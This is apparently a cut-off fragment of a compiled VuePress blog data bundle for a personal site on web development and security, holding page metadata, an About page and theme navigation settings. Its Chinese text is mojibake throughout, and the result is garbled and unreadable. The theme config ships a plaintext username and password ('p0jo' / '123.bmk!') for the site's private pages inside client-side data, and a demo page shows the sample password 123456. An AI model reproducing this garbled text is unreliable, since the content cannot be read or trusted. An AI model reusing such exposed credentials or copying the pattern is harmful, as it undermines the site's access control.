æµè¯.md",key:"v-a67c2976",path:"/more/blog/privatepage/",headers:[{level:2,title:"è®¾ç½®æç« ä¸ºç§å¯",slug:"è®¾ç½®æç« ä¸ºç§å¯",normalizedTitle:"è®¾ç½®æç« ä¸ºç§å¯",charIndex:13},{level:2,title:"ç§å¯æç« éç½®æ¹æ³",slug:"ç§å¯æç« éç½®æ¹æ³",normalizedTitle:"ç§å¯æç« éç½®æ¹æ³",charIndex:337}],headersStr:"è®¾ç½®æç« ä¸ºç§å¯ ç§å¯æç« éç½®æ¹æ³",content:"# ç§å¯æç« æµè¯\n\n\n# è®¾ç½®æç« ä¸ºç§å¯\n\nè¿æ¯ä¸ä¸ªç§å¯æç« ï¼ç¨æ·éè¦è¾å¥å¯ç æè½æ¥çï¼é¡µé¢å¼æºçæåµä¸ä¸æ¯æï¼\n\nè®¾ç½®æç« ä¸ºç§å¯ï¼å¹¶ä¸ä½¿ç¨å¨å±ç§å¯è®¾ç½®æ·»å å¦ä¸éç½®å³å¯ï¼\n\n---\nprivate: true     # å¼å¯æç« ç§å¯ï¼å¿é¡»\n---\n\n\n1\n2\n3\n\n\nè®¾ç½®æç« ä¸ºç§å¯å¹¶ä¸ä¸ä½¿ç¨å¨å±å¯ç éè¦æ·»å å¦ä¸éç½®ï¼\n\n---\nprivate: true     # å¼å¯æç« ç§å¯ï¼å¿é¡»\nusername: vdoing  # ç¨æ·åï¼å¿é¡»\npassword: 123456  # å¯ç ï¼å¿é¡»\nexpire: 86400000  # ç»å½è¶æ¶æ¶é´ï¼æ¯«ç§ï¼ï¼å¯éï¼ä¸å¡«åä»¥å¨å±è¶æ¶æ¶é´ä¸ºåï¼å¦æå¨å±ä¹æ²¡æè®¾ç½®ï¼åé»è®¤æ¯ä¸å¤©ï¼\n---\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# ç§å¯æç« éç½®æ¹æ³\n\nåèï¼https://notes.youngkbt.cn/about/website/private/",normalizedContent:"# ç§å¯æç« æµè¯\n\n\n# è®¾ç½®æç« ä¸ºç§å¯\n\nè¿æ¯ä¸ä¸ªç§å¯æç« ï¼ç¨æ·éè¦è¾å¥å¯ç æè½æ¥çï¼é¡µé¢å¼æºçæåµä¸ä¸æ¯æï¼\n\nè®¾ç½®æç« ä¸ºç§å¯ï¼å¹¶ä¸ä½¿ç¨å¨å±ç§å¯è®¾ç½®æ·»å å¦ä¸éç½®å³å¯ï¼\n\n---\nprivate: true     # å¼å¯æç« ç§å¯ï¼å¿é¡»\n---\n\n\n1\n2\n3\n\n\nè®¾ç½®æç« ä¸ºç§å¯å¹¶ä¸ä¸ä½¿ç¨å¨å±å¯ç éè¦æ·»å å¦ä¸éç½®ï¼\n\n---\nprivate: true     # å¼å¯æç« ç§å¯ï¼å¿é¡»\nusername: vdoing  # ç¨æ·åï¼å¿é¡»\npassword: 123456  # å¯ç ï¼å¿é¡»\nexpire: 86400000  # ç»å½è¶æ¶æ¶é´ï¼æ¯«ç§ï¼ï¼å¯éï¼ä¸å¡«åä»¥å¨å±è¶æ¶æ¶é´ä¸ºåï¼å¦æå¨å±ä¹æ²¡æè®¾ç½®ï¼åé»è®¤æ¯ä¸å¤©ï¼\n---\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# ç§å¯æç« éç½®æ¹æ³\n\nåèï¼https://notes.youngkbt.cn/about/website/private/",charsets:{cjk:!0},lastUpdated:"2022/05/14, 00:26:33",lastUpdatedTimestamp:1652487993e3},{title:"AboutME",frontmatter:{title:"AboutME",date:"2019-12-25T14:27:01.000Z",permalink:"/about",sidebar:!1,article:!1,readingShow:"top"},regularPath:"/05.%E5%85%B3%E4%BA%8E/01.%E5%85%B3%E4%BA%8E.html",relativePath:"05.å³äº/01.å³äº.md",key:"v-2555ef69",path:"/about/",headers:[{level:2,title:"ðBlog",slug:"ðblog",normalizedTitle:"ðblog",charIndex:2},{level:2,title:"ð¨Theme",slug:"ð¨theme",normalizedTitle:"ð¨theme",charIndex:184},{level:2,title:"ð¼Me",slug:"ð¼me",normalizedTitle:"ð¼me",charIndex:336},{level:3,title:"æè½",slug:"æè½",normalizedTitle:"æè½",charIndex:369},{level:2,title:"å¬ä¼å·",slug:"å¬ä¼å·",normalizedTitle:"å¬ä¼å·",charIndex:498},{level:2,title:"âï¸ èç³»",slug:"èç³»",normalizedTitle:"âï¸ èç³»",charIndex:507},{level:2,title:"åæ´è®°å½~",slug:"åæ´è®°å½",normalizedTitle:"åæ´è®°å½~",charIndex:584}],headersStr:"ðBlog ð¨Theme ð¼Me æè½ å¬ä¼å· âï¸ èç³» åæ´è®°å½~",content:"# ðBlog\n\nè¿æ¯ä¸ä¸ªå¼å·åå®¢æç« ãç¥è¯ç®¡çãææ¡£æ¥æ¾çä¸ªäººç½ç«ï¼ä¸»è¦åå®¹æ¯Webå¼ååå®å¨ç¸å³ææ¯ãåå®¢ä½¿ç¨Github ActionsåVuepress-theme-vdoingæ­å»ºï¼å¦æä½ åæ¬¢è¿ä¸ªåå®¢&ä¸»é¢æ¬¢è¿å°GitHubç¹ä¸ªStarï¼æèäº¤æ¢åé¾ ( â¢Ì Ï â¢Ì )â§\n\næç¤º\n\næç« åå®¹ä»æ¯æä¸ªäººçå°æ»ç»ï¼èµåå°æµï¼å¦æè¯¯è¿è¯·ææ­£ã\n\n\n\n\n# ð¨Theme\n\n\n\næ¬ç«ä¸»é¢æ¯ Vdoingï¼è¿æ¯ä¸æ¬¾ç®æ´é«æçVuePress ç¥è¯ç®¡ç&åå®¢ ä¸»é¢ãæ¨å¨è½»æ¾æé ä¸ä¸ªç»æåä¸ç¢çåå¹¶å­çä¸ªäººå¨çº¿ç¥è¯åº&åå®¢ï¼è®©ä½ çç¥è¯æµ·æ´åä¸æ¬æ¬ä¹¦ä¸æ ·æ¸æ°æè¯»ãéåå¤ç»´ç´¢å¼ï¼è®©æ¯ä¸ä¸ªç¥è¯ç¹é½å¯ä»¥å¿«éå®ä½ï¼ Githubå°å | å¨çº¿vscodeé¢è§æºç \n\n\n# ð¼Me\n\nä¸ä¸ªå¼ååå®å¨çå°ç½ï¼ä¸æ­æ¸ç´¢åå­¦ä¹ ææ¯ä¸­~\n\n\n# æè½\n\n * çæ JavaScriptãHTMLãCSSãVueãReact çæ¼å\n * äºè§£ LinuxãwindowsãmacOS çå¼å³æºæ¹å¼\n * ç²¾é Git ç pull å pushï¼å¹¶æ³¨åäº GitHub å¸å·å·äºä¸äº star\n\n\n# å¬ä¼å·\n\n\n\n# âï¸ èç³»\n\n * Email: p0josec@gmail.com\n * GitHub: https://github.com/p0josec\n\n\n# åæ´è®°å½~\n\n",normalizedContent:"# ðblog\n\nè¿æ¯ä¸ä¸ªå¼å·åå®¢æç« ãç¥è¯ç®¡çãææ¡£æ¥æ¾çä¸ªäººç½ç«ï¼ä¸»è¦åå®¹æ¯webå¼ååå®å¨ç¸å³ææ¯ãåå®¢ä½¿ç¨github actionsåvuepress-theme-vdoingæ­å»ºï¼å¦æä½ åæ¬¢è¿ä¸ªåå®¢&ä¸»é¢æ¬¢è¿å°githubç¹ä¸ªstarï¼æèäº¤æ¢åé¾ ( â¢ Ï â¢ )â§\n\næç¤º\n\næç« åå®¹ä»æ¯æä¸ªäººçå°æ»ç»ï¼èµåå°æµï¼å¦æè¯¯è¿è¯·ææ­£ã\n\n\n\n\n# ð¨theme\n\n\n\næ¬ç«ä¸»é¢æ¯ vdoingï¼è¿æ¯ä¸æ¬¾ç®æ´é«æçvuepress ç¥è¯ç®¡ç&åå®¢ ä¸»é¢ãæ¨å¨è½»æ¾æé ä¸ä¸ªç»æåä¸ç¢çåå¹¶å­çä¸ªäººå¨çº¿ç¥è¯åº&åå®¢ï¼è®©ä½ çç¥è¯æµ·æ´åä¸æ¬æ¬ä¹¦ä¸æ ·æ¸æ°æè¯»ãéåå¤ç»´ç´¢å¼ï¼è®©æ¯ä¸ä¸ªç¥è¯ç¹é½å¯ä»¥å¿«éå®ä½ï¼ githubå°å | å¨çº¿vscodeé¢è§æºç \n\n\n# ð¼me\n\nä¸ä¸ªå¼ååå®å¨çå°ç½ï¼ä¸æ­æ¸ç´¢åå­¦ä¹ ææ¯ä¸­~\n\n\n# æè½\n\n * çæ javascriptãhtmlãcssãvueãreact çæ¼å\n * äºè§£ linuxãwindowsãmacos çå¼å³æºæ¹å¼\n * ç²¾é git ç pull å pushï¼å¹¶æ³¨åäº github å¸å·å·äºä¸äº star\n\n\n# å¬ä¼å·\n\n\n\n# âï¸ èç³»\n\n * email: p0josec@gmail.com\n * github: https://github.com/p0josec\n\n\n# åæ´è®°å½~\n\n",charsets:{cjk:!0},lastUpdated:"2022/05/06, 15:59:11",lastUpdatedTimestamp:1651852751e3},{title:"ç§å¯æç« ç»å½",frontmatter:{title:"ç§å¯æç« ç»å½",date:"2022-05-14T14:26:04.000Z",permalink:"/private/login/",sidebar:!1,article:!1,comment:!1,editLink:!1,readingShow:"top"},regularPath:"/99.%E7%A7%81%E5%AF%86%E6%96%87%E7%AB%A0%E7%99%BB%E5%BD%95.html",relativePath:"99.ç§å¯æç« ç»å½.md",key:"v-3b782278",path:"/private/login/",headersStr:null,content:"æ¨å½åè®¿é®çæ¯åä¸»çç§å¯æç« ï¼è¯·è¾å¥ææçç¨æ·ååå¯ç ãå¦ææ²¡æï¼è¯·ååä¸»è·åã",normalizedContent:"æ¨å½åè®¿é®çæ¯åä¸»çç§å¯æç« ï¼è¯·è¾å¥ææçç¨æ·ååå¯ç ãå¦ææ²¡æï¼è¯·ååä¸»è·åã",charsets:{cjk:!0},lastUpdated:"2022/05/14, 00:26:33",lastUpdatedTimestamp:1652487993e3},{title:"å½æ¡£",frontmatter:{archivesPage:!0,title:"å½æ¡£",permalink:"/archives/",article:!1,readingShow:"top"},regularPath:"/@pages/archivesPage.html",relativePath:"@pages/archivesPage.md",key:"v-4e7874b6",path:"/archives/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/03, 11:09:41",lastUpdatedTimestamp:1648984181e3},{title:"åç±»",frontmatter:{categoriesPage:!0,title:"åç±»",permalink:"/categories/",article:!1,readingShow:"top"},regularPath:"/@pages/categoriesPage.html",relativePath:"@pages/categoriesPage.md",key:"v-0cedb105",path:"/categories/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/03, 11:09:41",lastUpdatedTimestamp:1648984181e3},{title:"æ ç­¾",frontmatter:{tagsPage:!0,title:"æ ç­¾",permalink:"/tags/",article:!1,readingShow:"top"},regularPath:"/@pages/tagsPage.html",relativePath:"@pages/tagsPage.md",key:"v-40954b25",path:"/tags/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/03, 11:09:41",lastUpdatedTimestamp:1648984181e3},{title:"Home",frontmatter:{home:!0,heroText:"ä¸æ ¡çç©å·é´",tagline:"æ¬²ä¹°æ¡è±åè½½éï¼ç»ä¸ä¼¼ãå°å¹´æ¸¸ã",pageClass:"vdoing-index-class",postList:"detailed",readingShow:"top"},regularPath:"/",relativePath:"index.md",key:"v-fd425884",path:"/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/05/06, 12:28:14",lastUpdatedTimestamp:1651840094e3}],themeConfig:{nav:[{text:"é¦é¡µ",link:"/"},{text:"å¼å",link:"/dev/",items:[{text:"åç«¯",items:[{text:"åç«¯ç®å½",link:"/dev/web/"},{text:"HTML/CSSåºç¡",link:"/dev/web/basis/htmlandcss/"}]},{text:"åç«¯",items:[{text:"Javaåç«¯",link:"/dev/java/"},{text:"Spring",link:"/dev/java/core/spring5/"},{text:"Mybatis",link:"/dev/java/core/mybatis/"},{text:"SpringMVC",link:"/dev/java/core/springmvc/"},{text:"Springbootåºç¡ç¯",link:"/dev/java/core/springbootbase/"},{text:"Docker",link:"/dev/java/eco/docker/"}]},{text:"è®¡ç®æºåºç¡",link:"/dev/basic/"}]},{text:"å®å¨",link:"/sec/",items:[{text:"éæåæ",link:"/sec/sa/"},{text:"æ¼æ´åç",link:"/sec/vuln/"},{text:"å®å¨å¼å",link:"/sec/dev/"}]},{text:"çæ´»",link:"/life/"},{text:"ç«ç¹å¯¼èª",link:"/navigation/"},{text:"æ´å¤",link:"/more/",items:[{text:"åç±»",link:"/categories/"},{text:"æ ç­¾",link:"/tags/"},{text:"å½æ¡£",link:"/archives/"},{text:"å³äº",link:"/about/"},{text:"åå®¢æ­å»º",link:"/more/blog/"}]},{text:"Travelling",link:"https://travellings.link/"}],sidebarDepth:2,logo:"https://wiki-1251603812.cos.ap-shanghai.myqcloud.com/images/logo.png",searchMaxSuggestions:10,lastUpdated:"ä¸æ¬¡æ´æ°",docsDir:"docs",editLinks:!1,editLinkText:"ç¼è¾",docBranch:"main",indexImg:{navColor:2,switchNavColor:!0,bgTimeColor:!0,bgTimeColorArray:["transparent","transparent","transparent","transparent"],descFade:!0,desc:["æ¬²ä¹°æ¡è±åè½½éï¼ç»ä¸ä¼¼ãå°å¹´æ¸¸ã"],descFontSize:"1.4rem",descFadeInTime:200,descFadeOutTime:100,descNextTime:800,bubble:!0,bubblePosition:0,bubbleNum:100},privatePage:{username:"p0jo",password:"123.bmk!",expire:864e5,loginPath:"/private/login/",loginKey:"vdoing_login",loginSession:!1},blogInfo:{blogCreate:"2022-01-01",indexView:!0,pageView:!0,readingTime:!0,eachFileWords:[{name:"å¼å",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.ç®å½é¡µ/00.å¯¼èªæ /01.å¼å.md",wordsCount:62,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"01.å¼å",description:"æå³ååç«¯å¼åçç¸å³ææ¯ã"}},title:"å¼å",date:"2021-10-21T16:43:47.000Z",permalink:"/dev/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"å®å¨",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.ç®å½é¡µ/00.å¯¼èªæ /02.å®å¨.md",wordsCount:65,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"02.å®å¨",description:"æ¸éæµè¯ãä»£ç å®¡è®¡ç¸å³çç¥è¯æ»ç»ã"}},title:"å®å¨",date:"2021-10-21T16:43:47.000Z",permalink:"/sec/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"çæ´»",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.ç®å½é¡µ/00.å¯¼èªæ /03.çæ´».md",wordsCount:58,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"03.çæ´»",description:"é²æ¥æ äºãåç¹ä»ä¹ã"}},title:"çæ´»",date:"2021-10-21T16:43:47.000Z",permalink:"/life/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"æ´å¤",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.ç®å½é¡µ/00.å¯¼èªæ /04.æ´å¤.md",wordsCount:64,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"04.æ´å¤",description:"å¶ä»ä¸äºæªå½æ¡£çåå®¹æå­æ­¤å¤ã"}},title:"æ´å¤",date:"2021-10-21T16:43:47.000Z",permalink:"/more/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"åç«¯",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.ç®å½é¡µ/01.å¼å/00.åç«¯.md",wordsCount:56,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"01.å¼å/100.åç«¯",description:"åç«¯å¼åç¸å³ææ¯æ»ç»ã"}},title:"åç«¯",date:"2022-01-16T17:47:41.000Z",permalink:"/dev/web/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"åç«¯",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.ç®å½é¡µ/01.å¼å/01.åç«¯.md",wordsCount:45,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"01.å¼å/101.åç«¯",description:"Javaåç«¯å¼åç¬è®°ã"}},title:"åç«¯",date:"2022-01-16T17:47:41.000Z",permalink:"/dev/java/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"è®¡ç®æºåºç¡",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.ç®å½é¡µ/01.å¼å/02.è®¡ç®æºåºç¡.md",wordsCount:58,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"01.å¼å/102.è®¡ç®æºåºç¡",description:"è®¡ç®æºç§å­¦ä¸ææ¯ä¸ä¸åºç¡ç¥è¯ã"}},title:"è®¡ç®æºåºç¡",date:"2022-01-16T17:47:41.000Z",permalink:"/dev/basic/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"éæåæ",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.ç®å½é¡µ/02.å®å¨/00.éæåæ.md",wordsCount:59,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"02.å®å¨/200.éæåæ",description:"ç¨åºåææ¦å¿µåç¥è¯ã"}},title:"éæåæ",date:"2022-01-16T17:47:41.000Z",permalink:"/sec/sa/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"æ¼æ´åç",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.ç®å½é¡µ/02.å®å¨/01.æ¼æ´åç.md",wordsCount:61,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"02.å®å¨/201.æ¼æ´åç",description:"å¸¸è§éç¨æ¼æ´çåçåæã"}},title:"æ¼æ´åç",date:"2022-01-16T17:47:41.000Z",permalink:"/sec/vuln/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"å®å¨å¼å",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.ç®å½é¡µ/02.å®å¨/02.å®å¨å¼å.md",wordsCount:62,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"02.å®å¨/202.å®å¨å¼å",description:"å®å¨ç¸å³çå·¥å·å¼ååå©ç¨ã"}},title:"å®å¨å¼å",date:"2022-01-16T17:47:41.000Z",permalink:"/sec/dev/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"å¥æ·«å·§æ",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.ç®å½é¡µ/02.å®å¨/03.å¥æ·«å·§æ.md",wordsCount:58,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"02.å®å¨/203.å¥æ·«å·§æ",description:"å®å¨ç¸å³çéªæä½ã"}},title:"å¥æ·«å·§æ",date:"2022-01-16T17:47:41.000Z",permalink:"/sec/skill/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"åå®¢æ­å»º",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.ç®å½é¡µ/04.æ´å¤/00.åå®¢æ­å»º.md",wordsCount:57,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"04.æ´å¤/400.åå®¢æ­å»º",description:"æ­å»ºåå®¢çè®°å½ã"}},title:"åå®¢æ­å»º",date:"2022-01-16T17:47:41.000Z",permalink:"/more/blog/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:" HTML&CSSåºç¡",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.å¼å/100.åç«¯/1000.åç«¯åºç¡/00. HTML&CSSåºç¡.md",wordsCount:"13k",readingTime:"49.9m",title:"HTML&CSSåºç¡",date:"2022-03-04T00:00:00.000Z",permalink:"/dev/web/basis/htmlandcss",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","åç«¯åºç¡"],tags:["HTML","CSS"],private:!0},{name:"Spring5",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.å¼å/101.åç«¯/1011.å¾®æå¡æ ¸å¿/00.Spring5.md",wordsCount:"8.5k",readingTime:"40.5m",title:"Spring5",date:"2022-01-01T00:00:00.000Z",permalink:"/dev/java/core/spring5",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","å¾®æå¡æ ¸å¿"],tags:["SSM","Spring5"]},{name:"SpringMVC",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.å¼å/101.åç«¯/1011.å¾®æå¡æ ¸å¿/01.SpringMVC.md",wordsCount:"12k",readingTime:"52.5m",title:"SpringMVC",date:"2022-01-06T00:00:00.000Z",permalink:"/dev/java/core/springmvc",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","å¾®æå¡æ ¸å¿"],tags:["SSM","SpringMVC"]},{name:"Mybatis",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.å¼å/101.åç«¯/1011.å¾®æå¡æ ¸å¿/02.Mybatis.md",wordsCount:"10.5k",readingTime:"49.7m",title:"MyBatis",date:"2022-01-11T00:00:00.000Z",permalink:"/dev/java/core/mybatis",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","å¾®æå¡æ ¸å¿"],tags:["SSM","Mabatis"]},{name:"MyBatisPlus",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.å¼å/101.åç«¯/1011.å¾®æå¡æ ¸å¿/03.MyBatisPlus.md",wordsCount:"5.4k",readingTime:"24.9m",title:"MyBatis-Plus",date:"2022-01-16T00:00:00.000Z",permalink:"/dev/java/core/mybatisplus",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","å¾®æå¡æ ¸å¿"],tags:["SSM","Mabatis","MyBatisPlus"]},{name:"SSM",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.å¼å/101.åç«¯/1011.å¾®æå¡æ ¸å¿/04.SSM.md",wordsCount:"5.8k",readingTime:"30.7m",title:"SSM",date:"2022-02-21T00:00:00.000Z",permalink:"/dev/java/core/ssm",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","å¾®æå¡æ ¸å¿"],tags:["SSM","Mabatis","Spring","SpringMVC"]},{name:"Springboot",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.å¼å/101.åç«¯/1011.å¾®æå¡æ ¸å¿/05.Springboot.md",wordsCount:"19.2k",readingTime:"1h32m",title:"Springboot1 åºç¡ç¯",date:"2022-04-28T03:11:00.000Z",permalink:"/dev/java/core/springbootbase",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","å¾®æå¡æ ¸å¿"],tags:["Springboot","Spring","SpringMVC"]},{name:"Docker",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.å¼å/101.åç«¯/1012.å¾®æå¡çæ/00.Docker.md",wordsCount:"12.2k",readingTime:"50.7m",title:"Docker",date:"2022-05-01T14:00:00.000Z",permalink:"/dev/java/eco/docker",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","å¾®æå¡çæ"],tags:["K8S","Docker","DockerCompose"]},{name:"SpringSecurity",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.å¼å/101.åç«¯/1012.å¾®æå¡çæ/01.SpringSecurity.md",wordsCount:"10.5k",readingTime:"47.1m",title:"Spring Security",date:"2022-04-24T09:00:00.000Z",permalink:"/dev/java/eco/springsecurity",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","å¾®æå¡çæ"],tags:["SpringSecurity"]},{name:"Shiro",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.å¼å/101.åç«¯/1012.å¾®æå¡çæ/02.Shiro.md",wordsCount:"8.6k",readingTime:"42.5m",title:"Shiro",date:"2022-04-15T00:00:00.000Z",permalink:"/dev/java/eco/shiro",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","å¾®æå¡çæ"],tags:["Springboot","Shiro"]},{name:"å°ç­¹ç½",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.å¼å/101.åç«¯/1013.é¡¹ç®å®æ/00.å°ç­¹ç½.md",wordsCount:"2.8k",readingTime:"13.6m",title:"å°ç­¹ç½",date:"2022-04-25T09:00:00.000Z",permalink:"/dev/java/project/cf",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","é¡¹ç®å®æ"],tags:["Javaé¡¹ç®"]},{name:"ä»£ç çæ®µ",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.å¼å/101.åç«¯/1013.é¡¹ç®å®æ/01.ä»£ç çæ®µ.md",wordsCount:347,readingTime:"1.9m",title:"ä»£ç çæ®µéå",date:"2022-09-11T09:00:00.000Z",permalink:"/dev/java/project/code",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","é¡¹ç®å®æ"],tags:["Javaé¡¹ç®"]},{name:"æ¦è¿°",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.å¼å/102.è®¡ç®æºåºç¡/1020.æ°æ®ç»æä¸ç®æ³/00.æ¦è¿°.md",wordsCount:"2.1k",readingTime:"7.9m",title:"ãæ°æ®ç»æãæ¦è¿°",date:"2022-05-04T20:00:00.000Z",permalink:"/dev/basic/ds/introduction",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","è®¡ç®æºåºç¡","æ°æ®ç»æä¸ç®æ³"],tags:["æ°æ®ç»æ"]},{name:"çº¿æ§è¡¨",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.å¼å/102.è®¡ç®æºåºç¡/1020.æ°æ®ç»æä¸ç®æ³/01.çº¿æ§è¡¨.md",wordsCount:"5.2k",readingTime:"22.5m",title:"ãæ°æ®ç»æãçº¿æ§è¡¨",date:"2022-05-06T23:00:00.000Z",permalink:"/dev/basic/ds/list",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","è®¡ç®æºåºç¡","æ°æ®ç»æä¸ç®æ³"],tags:["æ°æ®ç»æ","çº¿æ§è¡¨"]},{name:"æ¦è¿°",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.å¼å/102.è®¡ç®æºåºç¡/1021.è®¡ç®æºç½ç»/00.æ¦è¿°.md",wordsCount:"2.5k",readingTime:"9m",title:"ãè®¡ç®æºç½ç»ãæ¦è¿°",date:"2022-05-05T23:00:00.000Z",permalink:"/dev/basic/network/introduction",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","è®¡ç®æºåºç¡","è®¡ç®æºç½ç»"],tags:["è®¡ç®æºç½ç»"]},{name:"ç©çå±",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.å¼å/102.è®¡ç®æºåºç¡/1021.è®¡ç®æºç½ç»/01.ç©çå±.md",wordsCount:"1.6k",readingTime:"6.1m",title:"ãè®¡ç®æºç½ç»ãç©çå±",date:"2022-05-06T00:00:00.000Z",permalink:"/dev/basic/network/physicallayer",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","è®¡ç®æºåºç¡","è®¡ç®æºç½ç»"],tags:["è®¡ç®æºç½ç»"]},{name:"Introduction",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/200.éæåæ/2000.åäº¬å¤§å­¦è¯¾ç¨ç¬è®°/00.Introduction.md",wordsCount:"1.4k",readingTime:"6m",title:"SA - Introduction",date:"2022-02-01T00:00:00.000Z",permalink:"/sec/sa/nju/introduction",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["éæåæ","åäº¬å¤§å­¦è¯¾ç¨ç¬è®°"],tags:["PL","SA"]},{name:"IR",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/200.éæåæ/2000.åäº¬å¤§å­¦è¯¾ç¨ç¬è®°/01.IR.md",wordsCount:"1.6k",readingTime:"6.6m",title:"SA - IR",date:"2022-02-06T00:00:00.000Z",permalink:"/sec/sa/nju/ir",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["éæåæ","åäº¬å¤§å­¦è¯¾ç¨ç¬è®°"],tags:["PL","SA","IR"]},{name:"DFA-Applications",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/200.éæåæ/2000.åäº¬å¤§å­¦è¯¾ç¨ç¬è®°/02.DFA-Applications.md",wordsCount:"2.8k",readingTime:"12.1m",title:"SA - DFA-Applications",date:"2022-02-11T00:00:00.000Z",permalink:"/sec/sa/nju/dfaapplications",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["éæåæ","åäº¬å¤§å­¦è¯¾ç¨ç¬è®°"],tags:["PL","SA","DFA"]},{name:"DFA-Foundations",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/200.éæåæ/2000.åäº¬å¤§å­¦è¯¾ç¨ç¬è®°/03.DFA-Foundations.md",wordsCount:"2.2k",readingTime:"9.5m",title:"SA - DFA-Foundations",date:"2022-02-16T00:00:00.000Z",permalink:"/sec/sa/nju/dfafoundations",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["éæåæ","åäº¬å¤§å­¦è¯¾ç¨ç¬è®°"],tags:["PL","SA","DFA"]},{name:" CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.å®å¨/200.éæåæ/2001.CodeQL/00. CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼.md",wordsCount:"1.9k",readingTime:"8m",title:"CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼",date:"2022-04-03T00:00:00.000Z",permalink:"/sec/sa/codeql/uboot1",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["éæåæ","CodeQL"],tags:["CodeQL"]},{name:" CodeQL - UBootç»ä¹ 